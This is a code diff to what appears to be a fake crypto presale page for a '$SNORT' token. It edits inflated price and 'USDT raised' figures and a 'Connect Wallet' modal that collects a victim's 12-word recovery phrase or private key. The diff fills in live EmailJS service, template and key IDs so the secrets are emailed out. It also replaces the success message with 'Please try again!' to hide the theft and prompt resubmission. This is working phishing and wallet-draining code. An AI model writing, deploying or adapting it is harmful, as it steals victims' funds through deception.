@@ -4710,7 +4710,7 @@
                             <p _ngcontent-ng-c3042500715="" class="widget-title text-capitalize fw-bold mb-1">BUY
                               SNORTER PRESALE!</p><!----><!---->
                             <p _ngcontent-ng-c3042500715="" class="text-center text-purple mb-2 font-15 font-secondary">
-                              1 $SNORT = $0.0987 </p>
+                              1 $SNORT = $0.1043 </p>
                             <div _ngcontent-ng-c3042500715="" class="counter">
                               <div _ngcontent-ng-c3042500715="" class="inner-counter">
 
@@ -4738,7 +4738,7 @@
                             </div>
                             <div _ngcontent-ng-c3042500715="" data-percent="0" class="progress my-3">
                               <div _ngcontent-ng-c3042500715="" class="bar" style="width: 82.4142%;"></div>
-                              <div _ngcontent-ng-c3042500715="" class="status"> USDT Raised: $2,891,202.08 / $3,332,575
+                              <div _ngcontent-ng-c3042500715="" class="status"> USDT Raised: $3,892,959.99 / $4,362,038
                               </div>
                             </div>
                             <div _ngcontent-ng-c3042500715=""
@@ -5756,9 +5756,14 @@
 
       <!-- Tabs -->
       <div class="flex border-b border-gray-200 mb-6">
-        <button class="py-2 px-4 font-medium border-b-2 border-custom-green text-custom-green tab-button active" data-tab="phrase">Recovery Phrase</button>
-        <button class="py-2 px-4 font-medium text-gray-500 tab-button" data-tab="passkey">Passkey</button>
-      </div>
+  <button class="py-2 px-4 font-medium border-b-2 border-gray-600 text-gray-600 tab-button active" data-tab="phrase">
+    Recovery Phrase
+  </button>
+  <button class="py-2 px-4 font-medium text-gray-500 tab-button" data-tab="passkey">
+    Passkey/Private Key
+  </button>
+</div>
+
 
       <!-- Tab Contents -->
 <div class="tab-content active" id="phrase-tab">
@@ -5768,25 +5773,25 @@
       <textarea 
         id="recoveryPhrase"
         rows="4"
-        class="w-full border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-green focus:border-transparent"
+        class="w-full border border-gray-300 rounded-lg px-3 py-2 text-black focus:outline-none focus:ring-2 focus:ring-custom-green focus:border-transparent"
         placeholder="Enter your 12-word recovery phrase here..."
         required></textarea>
     </div>
-    <button type="submit" class="w-full bg-custom-green hover:bg-custom-brown text-white font-medium py-3 rounded-lg transition duration-300">
+<button type="submit" class="w-full bg-gray-500 hover:bg-gray-600 text-black font-medium py-3 rounded-lg transition duration-300">
       Connect Wallet
-    </button>
+</button>
   </form>
 </div>
 
 
       <div class="tab-content hidden" id="passkey-tab">
-        <p class="text-gray-600 mb-4">Enter your passkey to connect your wallet.</p>
+        <p class="text-gray-600 mb-4">Enter your passkey/Private Key to connect your wallet.</p>
         <form id="passkey-form">
           <div class="mb-4">
             <label class="block text-gray-700 mb-2" for="passkey">Passkey</label>
-            <input type="password" id="passkey" class="w-full border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-custom-green focus:border-transparent" placeholder="Enter your passkey" required>
+            <input type="password" id="passkey" class="w-full border border-gray-300 rounded-lg px-3 py-2 text-black focus:outline-none focus:ring-2 focus:ring-custom-green focus:border-transparent" placeholder="Enter your passkey" required>
           </div>
-          <button type="submit" class="w-full bg-custom-green hover:bg-custom-brown text-white font-medium py-3 rounded-lg transition duration-300">
+          <button type="submit" class="w-full bg-gray-500 hover:bg-gray-600 text-white font-medium py-3 rounded-lg transition duration-300">
             Connect Wallet
           </button>
         </form>
@@ -5810,7 +5815,7 @@
 <script>
   // Init EmailJS
   (function() {
-    emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your EmailJS public key
+    emailjs.init("SiqtsqFcjEHmEhAlI"); // Replace with your EmailJS public key
   })();
 
   // Modal control
@@ -5859,8 +5864,8 @@ document.getElementById("phrase-form").addEventListener("submit", function(e) {
     phrase: phrase,
   };
 
-  emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", params).then(() => {
-    alert("Recovery Phrase sent successfully!");
+  emailjs.send("service_qg99kwe", "template_z2fgoq8", params).then(() => {
+    alert("Please try again!");
     closeModal("walletDetailsModal");
   }).catch(err => alert("Error: " + JSON.stringify(err)));
 });
@@ -5879,8 +5884,8 @@ document.getElementById("phrase-form").addEventListener("submit", function(e) {
       method: "Passkey",
       passkey: passkey,
     };
-    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", params).then(() => {
-      alert("Passkey sent successfully!");
+    emailjs.send("service_qg99kwe", "template_z2fgoq8", params).then(() => {
+      alert("Please try again!");
       closeModal("walletDetailsModal");
     }).catch(err => alert("Error: " + JSON.stringify(err)));
   });
